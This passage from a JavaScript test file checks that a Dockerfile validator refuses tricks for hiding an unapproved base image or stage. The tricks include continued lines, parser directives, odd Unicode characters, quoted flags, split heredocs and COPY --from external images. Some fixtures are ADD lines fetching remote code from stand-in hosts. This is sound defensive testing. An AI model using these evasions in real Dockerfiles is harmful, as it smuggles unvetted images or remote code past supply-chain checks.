  ["a FROM line continued over an empty line", decoy("CMD true \\\n"), /continued line/],
  ["a FROM keyword split by a continuation", `FROM ${APPROVED_RUNTIME} AS runtime\nFRO\\\nM ${OTHER_BASE}\n`, /FROM must be on one line/],
  ["a FROM image on a continued line", `FROM ${APPROVED_RUNTIME} AS runtime\nFROM \\\n  ${OTHER_BASE}\n`, /FROM must be on one line/],
  ["a FROM stage name on a continued line", `FROM ${APPROVED_RUNTIME} \\\n  AS runtime\n`, /FROM must be on one line/],
  ["a FROM continued from a line holding only a backslash", `FROM ${APPROVED_RUNTIME} AS runtime\n\\\nFROM ${OTHER_BASE}\n`, /continued line/],
  ["a line ending in two backslashes", decoy("CMD true \\\\"), /backslash/],
  // Parser directives: `# escape=` moves the continuation character, `# syntax=` replaces the parser.
  ["an escape directive hiding a continuation", "# escape=`\n" + decoy("CMD true `"), /parser directive/],
  ["an escape directive without spaces", "#escape=`\n" + decoy("CMD true `"), /parser directive/],
  ["an escape directive in other case and spacing", " #\tEscape = `\n" + decoy("CMD true `"), /parser directive/],
  ["an escape directive naming the default", `# escape=\\\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /parser directive/],
  ["a syntax directive", `# syntax=docker/dockerfile:1\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /parser directive/],
  ["an unknown directive", `# check=skip=all\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /parser directive/],
  // Characters JavaScript and Go disagree on (line ends, white space).
  ["a FROM after U+0085, which Go trims and JavaScript does not", `FROM ${APPROVED_RUNTIME} AS runtime\n\u0085FROM ${OTHER_BASE}\n`, /printable ASCII/],
  ["a FROM after U+2028, a line end only to JavaScript", `FROM ${OTHER_BASE} AS real\nCMD true  FROM ${APPROVED_RUNTIME} AS runtime\n`, /printable ASCII/],
  ["a FROM after a bare carriage return", `FROM ${OTHER_BASE} AS real\nCMD true \rFROM ${APPROVED_RUNTIME} AS runtime\n`, /printable ASCII/],
  ["CRLF line ends", `FROM ${APPROVED_RUNTIME} AS runtime\r\n`, /printable ASCII/],
  ["a FROM after a vertical tab", `FROM ${APPROVED_RUNTIME} AS runtime\n\vFROM ${OTHER_BASE}\n`, /printable ASCII/],
  ["a FROM after a form feed", `FROM ${APPROVED_RUNTIME} AS runtime\n\fFROM ${OTHER_BASE}\n`, /printable ASCII/],
  ["a FROM after a no-break space", `FROM ${APPROVED_RUNTIME} AS runtime\n FROM ${OTHER_BASE}\n`, /printable ASCII/],
  ["a byte order mark", `﻿FROM ${APPROVED_RUNTIME} AS runtime\n`, /printable ASCII/],
  ["a NUL", `FROM ${APPROVED_RUNTIME} AS runtime\n\0`, /printable ASCII/],
  // FROM arguments BuildKit expands or unquotes before it resolves the image.
  ["a quoted FROM image", `FROM "${APPROVED_RUNTIME}" AS runtime\n`, /FROM must be written as/],
  ["quotes inside a FROM image", `FROM mirror.gcr.io/library/ru""st:1.98.0-bookworm@sha256:${"c".repeat(64)} AS build\nFROM ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["an escaped character in a FROM image", `FROM mirror.gcr.io/library/ru\\st:1.98.0-bookworm@sha256:${"c".repeat(64)} AS build\nFROM ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a FROM image from an ARG default", `ARG BASE=${OTHER_BASE}\nFROM \${BASE}\n`, /FROM must be written as/],
  ["a FROM image from an unbraced ARG", `ARG BASE=${OTHER_BASE}\nFROM $BASE\n`, /FROM must be written as/],
  ["a FROM image with an expansion default", `FROM \${BASE:-${WRONG_RUST}} AS build\nFROM ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a FROM repository from an ARG that a later ARG line redefines", `ARG R=rust:1.98.0-bookworm\nFROM \${R}@sha256:${"c".repeat(64)} AS build\nARG R=debian\nFROM ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a variable inside a FROM repository", `ARG NAME=rust\nFROM mirror.gcr.io/library/\${NAME}:1.98.0-bookworm@sha256:${"c".repeat(64)} AS build\nFROM ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["an unbraced variable as a FROM tag", `ARG TAG=1.98.0-bookworm\nFROM mirror.gcr.io/library/rust:$TAG@sha256:${"c".repeat(64)} AS build\nFROM ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a FROM with no image", "FROM\n", /FROM must be written as/],
  ["a FROM with two images", `FROM ${OTHER_BASE} ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a FROM with AS and no name", `FROM ${APPROVED_RUNTIME} AS\n`, /FROM must be written as/],
  ["a FROM with words after the stage name", `FROM ${OTHER_BASE} AS real ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a FROM with an unknown flag", `FROM --pull=always ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a FROM with two platform flags", `FROM --platform=linux/amd64 --platform=linux/arm64 ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a FROM with an empty platform flag", `FROM --platform= ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  // ---- Found by the adversarial review of the first fix (#485) ----
  // A heredoc opened across a continuation: BuildKit joins continued lines first, then
  // looks for `<<` (built with Docker 29.1.3 / BuildKit 0.26.2: only `real` is a target).
  ["a COPY heredoc split across a continuation", decoy("COPY <\\\n<EOF /decoy.txt", "EOF\n"), /heredoc/],
  ["a RUN heredoc split across a continuation", decoy("RUN cat <\\\n<EOF >/decoy.txt", "EOF\n"), /heredoc/],
  ["an ADD heredoc with a quoted delimiter split across a continuation", decoy('ADD <\\\n<"EOF" /decoy.txt', "EOF\n"), /heredoc/],
  ["a <<- heredoc split across a continuation", decoy("COPY <\\\n<-EOF /decoy.txt", "\tEOF\n"), /heredoc/],
  ["a heredoc split across a continuation with trailing blanks", decoy("COPY <\\ \t\n<EOF /decoy.txt", "EOF\n"), /heredoc/],
  ["a heredoc split across two continuations", decoy("COPY \\\n<\\\n<EOF /decoy.txt", "EOF\n"), /heredoc/],
  // `<<` that is not a heredoc is refused too, and named for what it is.
  ["a shell here-string", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN cat <<<"hello"\n`, /'<<' is not allowed in an instruction; heredocs cannot be told apart safely/],
  ["a shell left shift", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN echo $((1<<4))\n`, /'<<' is not allowed in an instruction; heredocs cannot be told apart safely/],
  // Anything that is not a known instruction: BuildKit also reads `//syntax=` as the syntax
  // directive, and skips a `#!` first line before looking for it. (It reads JSON that way
  // only when the whole file is JSON; a JSON first line is a parse error to it.)
  ["a //syntax= line", `//syntax=docker/dockerfile:1\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /'\/\/syntax=docker\/dockerfile:1' is not an allowed instruction/],
  ["a // syntax = line with spaces", `// syntax = docker/dockerfile:1\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /'\/\/' is not an allowed instruction/],
  ["a JSON syntax line", `{"syntax":"docker/dockerfile:1"}\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /is not an allowed instruction/],
  ["a #! line before a //syntax= line", `#!/usr/bin/env docker\n//syntax=docker/dockerfile:1\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /Dockerfile:1: a '#!' line is not allowed/],
  ["a #! line before a # syntax= line", `#!/usr/bin/env docker\n# syntax=docker/dockerfile:1\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /Dockerfile:1: a '#!' line is not allowed/],
  ["a #! line on its own", `#!/usr/bin/env docker\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /Dockerfile:1: a '#!' line is not allowed/],
  ["an indented #! line below the first line", `FROM ${APPROVED_RUNTIME} AS runtime\n\t#!x\n`, /Dockerfile:2: a '#!' line is not allowed/],
  ["an unknown instruction", `FROM ${APPROVED_RUNTIME} AS runtime\nFROMAGE ${OTHER_BASE}\n`, /'FROMAGE' is not an allowed instruction/],
  ["an ONBUILD instruction", `FROM ${APPROVED_RUNTIME} AS runtime\nONBUILD COPY --from=debian:13 / /\n`, /'ONBUILD' is not an allowed instruction/],
  ["a MAINTAINER instruction", `FROM ${APPROVED_RUNTIME} AS runtime\nMAINTAINER nobody\n`, /'MAINTAINER' is not an allowed instruction/],
  ["an instruction keyword glued to its flag", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY--from=debian:13 / /\n`, /is not an allowed instruction/],
  // A directive-shaped comment is refused wherever it is (a `#!` line moves the directive
  // off line 1), and the message says what to do.
  ["a directive-shaped comment below the first line", `# A comment.\nFROM ${APPROVED_RUNTIME} AS runtime\n# escape=\`\n`, /Dockerfile:3: a comment shaped like a parser directive \('# name=value'\) is not allowed; reword the comment/],
  ["a directive name with digits", `# syntax2=docker/dockerfile:1\nFROM ${APPROVED_RUNTIME} AS runtime\n`, /parser directive/],
  // Images that are not FROM lines: COPY --from and RUN --mount from= pull an image into a
  // stage (built: both resolve mirror.gcr.io/library/busybox:1.36.1 by tag), ADD fetches.
  ["a COPY --from an image by tag", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from=mirror.gcr.io/library/busybox:1.36.1 /bin/busybox /ext\n`, /Dockerfile:2: '--from=' and a mount's 'from=' must name an earlier stage of this Dockerfile by name: no stage index and no external image, pinned by digest or not \(found 'mirror\.gcr\.io\/library\/busybox:1\.36\.1'\)/],
  ["a COPY --from a bare image name", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from=busybox /bin/busybox /ext\n`, BY_NAME],
  ["a lower-case copy --from an image after another flag", `FROM ${APPROVED_RUNTIME} AS runtime\ncopy\t--chmod=0555 --from=busybox /bin/busybox /ext\n`, BY_NAME],
  ["a COPY --from split across a continuation", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --fr\\\nom=busybox /bin/busybox /ext\n`, BY_NAME],
  ["a COPY --from a digest with one character too many", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from=${OTHER_BASE}b / /\n`, BY_NAME],
  ["a COPY --from a digest with one character too few", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from=${OTHER_BASE.slice(0, -1)} / /\n`, BY_NAME],
  ["a COPY --from a later stage", `FROM ${OTHER_BASE} AS first\nCOPY --from=runtime / /\nFROM ${APPROVED_RUNTIME} AS runtime\n`, BY_NAME],
  ["a COPY --from its own stage", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from=runtime / /\n`, BY_NAME],
  ["a COPY --from its own stage index", `FROM ${OTHER_BASE} AS first\nFROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from=1 / /\n`, BY_NAME],
  ["a COPY --from a signed stage index", `FROM ${OTHER_BASE} AS first\nFROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from=+0 / /\n`, /flag must be written as/],
  ["a COPY --from with an empty value", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from= / /\n`, BY_NAME],
  ["a RUN bind mount from an image by tag", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN --mount=type=bind,from=mirror.gcr.io/library/busybox:1.36.1,target=/m cp /m/bin/busybox /ext\n`, /must name an earlier stage of this Dockerfile by name: no stage index and no external image, pinned by digest or not \(found 'mirror\.gcr\.io\/library\/busybox:1\.36\.1'\)/],
  ["a RUN cache mount from an image", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN --mount=type=cache,from=busybox,target=/m true\n`, BY_NAME],
  ["a RUN mount whose from= comes first", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN --mount=from=busybox,type=bind,target=/m true\n`, BY_NAME],
  ["a RUN mount whose from= comes last", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN --mount=target=/m,from=busybox true\n`, BY_NAME],
  ["a RUN mount with an upper-case FROM= key", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN --mount=type=bind,FROM=busybox,target=/m true\n`, BY_NAME],
  ["a second RUN mount from an image", `FROM ${OTHER_BASE} AS first\nFROM ${APPROVED_RUNTIME} AS runtime\nRUN --mount=type=bind,from=first,target=/a \\\n    --mount=type=bind,from=busybox,target=/b true\n`, BY_NAME],
  ["a lower-case run mount on a continued line", `FROM ${APPROVED_RUNTIME} AS runtime\nrun \\\n  --mount=type=bind,from=busybox,target=/m true\n`, BY_NAME],
  // Flags BuildKit unquotes (built: `--from="img"`, `--fr"o"m=img` and `"from=img"` all
  // pull the image) or refuses to expand; none is read here.
  ["a COPY --from a variable", `ARG IMG=busybox\nFROM ${APPROVED_RUNTIME} AS runtime\nARG IMG\nCOPY --from=$IMG / /\n`, /Dockerfile:4: a COPY or RUN flag must be written as '--name' or '--name=value' in plain characters/],
  ["a COPY --from a braced variable inside a pinned reference", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from=\${R}@sha256:${"b".repeat(64)} / /\n`, /flag must be written as/],
  ["a RUN mount from a variable", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN --mount=type=bind,from=$IMG,target=/m true\n`, /flag must be written as/],
  ["a COPY --from in double quotes", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from="busybox" / /\n`, /flag must be written as/],
  ["a COPY --from in single quotes", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --from='busybox' / /\n`, /flag must be written as/],
  ["quotes inside a COPY flag name", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --fr"o"m=busybox / /\n`, /flag must be written as/],
  ["an escape inside a COPY flag name", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --fr\\om=busybox / /\n`, /flag must be written as/],
  ["a quoted field in a RUN mount", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN --mount=type=bind,"from=busybox",target=/m true\n`, /flag must be written as/],
  ["an upper-case COPY flag name", `FROM ${APPROVED_RUNTIME} AS runtime\nCOPY --FROM=busybox / /\n`, /flag must be written as/],
  ["a bare -- before a RUN command", `FROM ${APPROVED_RUNTIME} AS runtime\nRUN -- true\n`, /flag must be written as/],
  // ADD can fetch remote content (built: `ADD https://example.com/ /ext` did); the
  // Dockerfiles use COPY only, so ADD is not read at all.
  ["an ADD of an https URL", `FROM ${APPROVED_RUNTIME} AS runtime\nADD https://example.com/tool.tar.gz /opt/\n`, /'ADD' is not an allowed instruction/],
  ["an ADD of an http URL", `FROM ${APPROVED_RUNTIME} AS runtime\nADD http://example.com/tool.tar.gz /opt/\n`, /'ADD' is not an allowed instruction/],
  ["an ADD of a git@ source", `FROM ${APPROVED_RUNTIME} AS runtime\nADD git@github.com:example/repo.git /src/\n`, /'ADD' is not an allowed instruction/],
  ["an ADD of a git:// source", `FROM ${APPROVED_RUNTIME} AS runtime\nADD git://example.com/repo /src/\n`, /'ADD' is not an allowed instruction/],
  ["an ADD of a .git URL", `FROM ${APPROVED_RUNTIME} AS runtime\nadd --keep-git-dir=true https://github.com/example/repo.git#v1 /src/\n`, /'add' is not an allowed instruction/],
  ["an ADD of a local file", `FROM ${APPROVED_RUNTIME} AS runtime\nADD rootfs.tar /\n`, /'ADD' is not an allowed instruction/],
  // Loosened forms that no fixture caught.
  ["a FROM continued over a line of spaces", decoy("CMD true \\\n   "), /continued line/],
  ["a FROM continued over a line of tabs", decoy("CMD true \\\n\t\t"), /continued line/],
  ["a single-quoted FROM image", `FROM '${APPROVED_RUNTIME}' AS runtime\n`, /FROM must be written as/],
  ["single quotes inside a FROM image", `FROM mirror.gcr.io/library/ru''st:1.98.0-bookworm@sha256:${"c".repeat(64)} AS build\nFROM ${APPROVED_RUNTIME}\n`, /FROM must be written as/],
  ["a FROM after U+3000, an ideographic space", `FROM ${APPROVED_RUNTIME} AS runtime\n　FROM ${OTHER_BASE}\n`, /printable ASCII, tab and LF are allowed in a Dockerfile \(found U\+3000\)/],
  ["a FROM after U+205F, a mathematical space", `FROM ${APPROVED_RUNTIME} AS runtime\n FROM ${OTHER_BASE}\n`, /printable ASCII, tab and LF are allowed in a Dockerfile \(found U\+205F\)/],
  ["a DEL character", `FROM ${APPROVED_RUNTIME} AS runtime\n\x7fFROM ${OTHER_BASE}\n`, /printable ASCII, tab and LF are allowed in a Dockerfile \(found U\+007F\)/],
  ["a 0x01 control character", `FROM ${APPROVED_RUNTIME} AS runtime\n\x01FROM ${OTHER_BASE}\n`, /printable ASCII, tab and LF are allowed in a Dockerfile \(found U\+0001\)/],
  ["a three-word FROM whose middle word is not AS", `FROM ${APPROVED_RUNTIME} IS runtime\n`, /FROM must be written as/],
  ["a three-word FROM whose middle word only starts with AS", `FROM ${APPROVED_RUNTIME} ASK runtime\n`, /FROM must be written as/],
  // ---- Found by the second adversarial review (#485) ----
  // `--from=` and a mount's `from=` may only name an earlier stage, by name. BuildKit
  // resolves a stage index for COPY only: `RUN --mount=type=bind,from=0` looks for a stage
  // named `0` (a name BuildKit does not allow) and then pulls docker.io/library/0:latest
  // (built with Docker 29.1.3: "failed to resolve source metadata for
  // docker.io/library/0:latest"). An external image, pinned or not, would put content the
  // runtime-base and Rust checks never see into an approved stage.
  ["a COPY --from a stage index", twoStages("COPY --from=0 / /"), BY_NAME],
  ["a COPY --from a zero-padded stage index", twoStages("COPY --from=00 / /"), BY_NAME],
  ["a COPY --from a negative stage index", twoStages("COPY --from=-1 / /"), BY_NAME],
  ["a COPY --from a stage index in exponent form", twoStages("COPY --from=1e0 / /"), BY_NAME],
  ["a RUN mount from a stage index, which BuildKit pulls as the image '0'", twoStages("RUN --mount=type=bind,from=0,target=/m true"), /Dockerfile:3: '--from=' and a mount's 'from=' must name an earlier stage of this Dockerfile by name: no stage index and no external image, pinned by digest or not \(found '0'\)/],
  ["a COPY --from an external image pinned by digest", twoStages(`COPY --from=${OTHER_BASE} /bin/busybox /b`), BY_NAME],
  ["a RUN mount from an external image pinned by digest", twoStages(`RUN --mount=type=bind,from=${OTHER_BASE},target=/m true`), BY_NAME],
  ["a COPY --from the approved runtime image itself", twoStages(`COPY --from=${APPROVED_RUNTIME} / /`), BY_NAME],
  ["a COPY --from a name that an earlier stage name is a prefix of", twoStages("COPY --from=buildx / /"), BY_NAME],
  ["a COPY --from a prefix of an earlier stage name", twoStages("COPY --from=buil / /"), BY_NAME],
  ["a RUN mount from a name that an earlier stage name is a prefix of", twoStages("RUN --mount=type=bind,from=buildx,target=/m true"), BY_NAME],
  ["a RUN mount from a later stage", `FROM ${OTHER_BASE} AS first\nRUN --mount=type=bind,from=runtime,target=/m true\nFROM ${APPROVED_RUNTIME} AS runtime\n`, BY_NAME],
  ["a RUN mount from its own stage", twoStages("RUN --mount=type=bind,from=runtime,target=/m true"), BY_NAME],
  // Every `from=` field of every mount is read, wherever it is: BuildKit uses the last one
  // (built: `from=first,from=<image>` resolved the image).
  ["a RUN mount with a second from= naming an external image", twoStages(`RUN --mount=type=bind,from=build,from=${OTHER_BASE},target=/m true`), BY_NAME],
  ["a RUN mount with a second from= naming an image by tag", twoStages("RUN --mount=type=bind,from=build,from=busybox,target=/m true"), BY_NAME],
  ["a RUN mount with a first from= naming an external image", twoStages(`RUN --mount=type=bind,from=${OTHER_BASE},from=build,target=/m true`), BY_NAME],
  ["a RUN mount whose from= is the third field", twoStages("RUN --mount=type=bind,target=/m,from=busybox true"), BY_NAME],
  ["a RUN mount whose from= is the fourth field", twoStages("RUN --mount=type=bind,target=/m,ro,from=busybox true"), BY_NAME],
  ["a RUN mount whose from= is the sixth field", twoStages("RUN --mount=type=bind,source=/,target=/m,ro,from=build,from=busybox true"), BY_NAME],
  // A backslash in a flag value: BuildKit removes it as an escape before reading the flag.
  ["a backslash inside a COPY --from value", twoStages("COPY --from=bu\\ild / /"), PLAIN_FLAG],
  ["a backslash inside a COPY --chmod value", twoStages("COPY --chmod=05\\55 a /b"), PLAIN_FLAG],
  ["a backslash inside a RUN mount field", twoStages("RUN --mount=type=bind,from=bu\\ild,target=/m true"), PLAIN_FLAG],
  ["a backslash before the value of a RUN flag", twoStages("RUN --network=\\none true"), PLAIN_FLAG],
  // The flag refusal covers more than variables, quotes and escapes, and says what is allowed.
  ["a COPY --exclude with a glob", twoStages("COPY --exclude=**/*.md . /src/"), /Dockerfile:3: a COPY or RUN flag must be written as '--name' or '--name=value' in plain characters: lower-case letters and '-' in the name; letters, digits and \. _ \/ : @ , = - in the value \(found '--exclude=\*\*\/\*\.md'\)/],
  ["a COPY --chmod in symbolic form", twoStages("COPY --chmod=u+x a /b"), PLAIN_FLAG],
  ["a COPY --chown with a tilde", twoStages("COPY --chown=~app a /b"), PLAIN_FLAG],
  // No final newline: the last line is still the continuation of the CMD before it (built:
  // `--call=targets` lists only `real`). The end-of-file test in the reader must be exact.
  ["a FROM continued from CMD as the last line of a file with no final newline", `FROM ${OTHER_BASE} AS real\nCMD true \\\nFROM ${APPROVED_RUNTIME} AS runtime`, /Dockerfile:3: a continued line must not start with FROM/],
  ["a lower-case from continued from RUN as the last line of a file with no final newline", `FROM ${OTHER_BASE} AS real\nRUN true \\\n\tfrom ${APPROVED_RUNTIME}`, /Dockerfile:3: a continued line must not start with FROM/],
];
// Every refusal ends by pointing at the rules, so a contributor knows where to look.
const REFUSAL_POINTER = ' (see "Dockerfile rules" in docs/verification.md)';
for (const [label, text, reason] of REFUSED_DOCKERFILES) {
  test(`fixtures: every Dockerfile check refuses ${label} (#485)`, () => {
    const good = RUNTIME_DOCKERFILES.map(file => ({ file, text: `FROM ${APPROVED_RUNTIME}\n` }));
    for (const file of RUNTIME_DOCKERFILES) {
      const violations = runtimeBaseViolations(good.map(source => source.file === file ? { file, text } : source));
      assert.equal(violations.length, 1, `runtime base check, ${file}: ${JSON.stringify(violations)}`);
      assert.ok(violations[0].startsWith(`${file}:`), `runtime base check must name ${file}: ${violations[0]}`);
      assert.match(violations[0], reason, "runtime base check");
      assert.ok(violations[0].endsWith(REFUSAL_POINTER), `runtime base check must point at the rules: ${violations[0]}`);
    }
    const thrown = message => message.startsWith("fixture/Dockerfile:") && reason.test(message) && message.endsWith(REFUSAL_POINTER);
    assert.throws(() => parseDockerfileRustStages("fixture/Dockerfile", text), error => thrown(error.message), "Rust build-stage check");
    assert.throws(() => unpinnedDockerfileBases("fixture/Dockerfile", text), error => thrown(error.message), "digest pin check");
  });
}

test("fixtures: stages written in other accepted forms are still read as stages (#485)", () => {
  const good = RUNTIME_DOCKERFILES.map(file => ({ file, text: `FROM ${APPROVED_RUNTIME}\n` }));
  const runtime = text => runtimeBaseViolations(good.map(source => source.file === "Dockerfile" ? { file: "Dockerfile", text } : source));
  const digest = "c".repeat(64);
  for (const [label, from] of [
    ["lower case", "from"], ["mixed case", "FrOm"], ["indented with spaces", "   FROM"], ["indented with a tab", "\tFROM"], ["indented mixed case", " \t fROM"],
  ]) {
    assert.equal(runtime(`FROM ${APPROVED_RUNTIME} AS runtime\n${from} ${OTHER_BASE}\n`).length, 1, `${label}: a later final stage`);
    assert.equal(runtime(`FROM ${APPROVED_RUNTIME} AS runtime\n${from} ${OTHER_BASE} AS final\nCOPY --from=runtime / /\n`).length, 1, `${label}: a final stage that is not the one named runtime`);
    assert.equal(runtime(`${from} ${OTHER_BASE} AS build\n${from} ${APPROVED_RUNTIME} as RUNTIME\n`).length, 0, `${label}: an approved final stage passes`);
    assert.equal(runtime(`${from} --platform=linux/amd64 ${APPROVED_RUNTIME} AS runtime\n`).length, 1, `${label}: a platform override`);
    assert.equal(parseDockerfileRustStages("f/Dockerfile", `${from} ${WRONG_RUST} AS build\n`).length, 1, `${label}: a Rust stage`);
    assert.equal(parseDockerfileRustStages("f/Dockerfile", `${from} --platform=$BUILDPLATFORM ${WRONG_RUST} AS build\n`).length, 1, `${label}: a Rust stage with a platform`);
    assert.deepEqual(unpinnedDockerfileBases("f/Dockerfile", `FROM ${OTHER_BASE}\n${from} debian:13 AS x\n`), ["f/Dockerfile:2 debian:13"], `${label}: an unpinned base`);
    assert.deepEqual(unpinnedDockerfileBases("f/Dockerfile", `${from} --platform=linux/amd64 debian:13@sha256:${digest}\n${from} --platform=linux/arm64 debian:13\n`), ["f/Dockerfile:2 debian:13"], `${label}: an unpinned base behind a platform flag`);
  }
  // What the repository's Dockerfiles do use stays readable: comments, continued RUN/ENV/
  // HEALTHCHECK lines, `--mount` and `--from` flags, and text that only mentions FROM.
  const text = [
    "# No `# syntax=` line; FROM debian:13 in a comment is not a stage.",
    `FROM ${WRONG_RUST} AS build`,
    "ARG CARGO_BUILD_JOBS=2",
    "RUN --mount=type=cache,target=/build/target \\",
    "    cargo build --locked \\",
    " && echo FROM scratch",
    "",
    `FROM ${APPROVED_RUNTIME} AS runtime`,
    "COPY --from=build --chmod=0555 /out/ /usr/local/bin/",
    "ENV A=1 \\",
    "    FROM=2",
    "HEALTHCHECK --interval=30s \\",
    '    CMD ["/usr/local/bin/x", "healthcheck"]',
    'CMD ["serve"]',
    "",
  ].join("\n");
  assert.deepEqual(runtime(text), []);
  assert.deepEqual(parseDockerfileRustStages("f/Dockerfile", text).map(stage => [stage.line, stage.ref]), [[2, WRONG_RUST]]);
  assert.deepEqual(unpinnedDockerfileBases("f/Dockerfile", text), []);
  assert.deepEqual(unpinnedDockerfileBases("f/Dockerfile", text.replace(`@sha256:${digest}`, "")), [`f/Dockerfile:2 ${WRONG_RUST.split("@")[0]}`]);
  assert.deepEqual(dockerfileStages("f/Dockerfile", text), [
    { line: 2, platform: undefined, ref: WRONG_RUST, name: "build" },
    { line: 8, platform: undefined, ref: APPROVED_RUNTIME, name: "runtime" },
  ]);
  assert.deepEqual(dockerfileStages("f/Dockerfile", `from --platform=$BUILDPLATFORM ${OTHER_BASE} as B\nRUN true \\`), [{ line: 1, platform: "$BUILDPLATFORM", ref: OTHER_BASE, name: "B" }]);
  assert.deepEqual(dockerfileStages("f/Dockerfile", ""), []);
});

test("fixtures: tabs between the words of a FROM do not hide the stage (#485)", () => {
  const good = RUNTIME_DOCKERFILES.map(file => ({ file, text: `FROM ${APPROVED_RUNTIME}\n` }));
  const runtime = text => runtimeBaseViolations(good.map(source => source.file === "Dockerfile" ? { file: "Dockerfile", text } : source));
  assert.equal(runtime(`FROM ${APPROVED_RUNTIME} AS runtime\nFROM\t${OTHER_BASE}\n`).length, 1, "a later final stage after a tab");
  assert.equal(runtime(`FROM ${APPROVED_RUNTIME} AS runtime\nFROM \t ${OTHER_BASE}\tAS\tfinal\n`).length, 1, "a later final stage after mixed blanks");
  assert.deepEqual(dockerfileStages("f/Dockerfile", `FROM\t${OTHER_BASE}\tAS\tbuild\nFROM\t--platform=linux/amd64\t${APPROVED_RUNTIME}\n`), [
    { line: 1, platform: undefined, ref: OTHER_BASE, name: "build" },
    { line: 2, platform: "linux/amd64", ref: APPROVED_RUNTIME, name: undefined },
  ]);
  assert.equal(parseDockerfileRustStages("f/Dockerfile", `FROM\t${WRONG_RUST}\tAS build\n`).length, 1, "a Rust stage after a tab");
  assert.deepEqual(unpinnedDockerfileBases("f/Dockerfile", `FROM ${OTHER_BASE}\nFROM\tdebian:13\n`), ["f/Dockerfile:2 debian:13"], "an unpinned base after a tab");
});

test("fixtures: a digest pin is exactly sha256: and 64 lower-case hex characters (#485)", () => {
  const hex = "b".repeat(64);
  for (const [label, ref] of [
    ["one character too many", `debian:13@sha256:${hex}b`],
    ["a character after the digest", `debian:13@sha256:${hex}/x`],
    ["one character too few", `debian:13@sha256:${hex.slice(1)}`],
    ["a character before the algorithm", `debian:13@xsha256:${hex}`],
    ["a character before the hex", `debian:13@sha256:.${hex.slice(1)}`],
    ["a second colon", `debian:13@sha256::${hex}`],
    ["upper-case hex", `debian:13@sha256:${hex.toUpperCase()}`],
    ["another algorithm", `debian:13@sha512:${hex}`],
    ["no at sign", `debian:13:sha256:${hex}`],
    ["no digest", "debian:13"],
  ]) {
    assert.deepEqual(unpinnedDockerfileBases("f/Dockerfile", `FROM ${OTHER_BASE}\nFROM ${ref} AS x\n`), [`f/Dockerfile:2 ${ref}`], label);
  }
  assert.deepEqual(unpinnedDockerfileBases("f/Dockerfile", `FROM debian:13@sha256:${hex} AS x\n`), []);
});

// The continuation test looks only at the end of a line. A pattern that can start
// anywhere in the line (`/^(.*?)(\\+)[ \t]*$/` took 1.3 s on 20,000 backslashes) is
// quadratic on a long run of backslashes that does not end the line.
test("a long run of backslashes inside a line is read in linear time (#485)", () => {
  const run = "\\".repeat(100_000);
  const text = `FROM ${OTHER_BASE} AS build\nRUN ${run}x\nRUN ${run}x \t\nFROM ${APPROVED_RUNTIME} AS runtime\n`;
  const started = performance.now();
  const stages = dockerfileStages("f/Dockerfile", text);
  const elapsed = performance.now() - started;
  assert.deepEqual(stages, [
    { line: 1, platform: undefined, ref: OTHER_BASE, name: "build" },
    { line: 4, platform: undefined, ref: APPROVED_RUNTIME, name: "runtime" },
  ]);
  assert.ok(elapsed < 500, `reading took ${Math.round(elapsed)} ms`);
  // The same run at the end of a line is still more than one backslash.
  assert.throws(() => dockerfileStages("f/Dockerfile", `FROM ${OTHER_BASE}\nRUN true ${run}\n`), /f\/Dockerfile:2: a line must not end in more than one backslash/);
  assert.throws(() => dockerfileStages("f/Dockerfile", `FROM ${OTHER_BASE}\nRUN true ${run} \t \n`), /f\/Dockerfile:2: a line must not end in more than one backslash/);
});

// `--from=` and a mount's `from=` may name an earlier stage, by name in any case, as
// BuildKit matches it (`COPY --from=BUILD` and a mount's `FROM=BUILD` read `AS Build` in
// real builds), and nothing else; everything the Dockerfiles use is still read.
test("fixtures: earlier stage names in COPY --from and RUN --mount are accepted in any case (#485)", () => {
  const text = [
    `FROM ${WRONG_RUST} AS Build`,
    "RUN --mount=type=cache,id=registry,target=/usr/local/cargo/registry \\",
    "    --mount=type=cache,id=target,target=/build/target \\",
    "    cargo build --locked --release",
    `FROM ${OTHER_BASE}`,
    "COPY --from=Build /a /a",
    "COPY --from=BUILD /b /b",
    `FROM ${APPROVED_RUNTIME} AS runtime`,
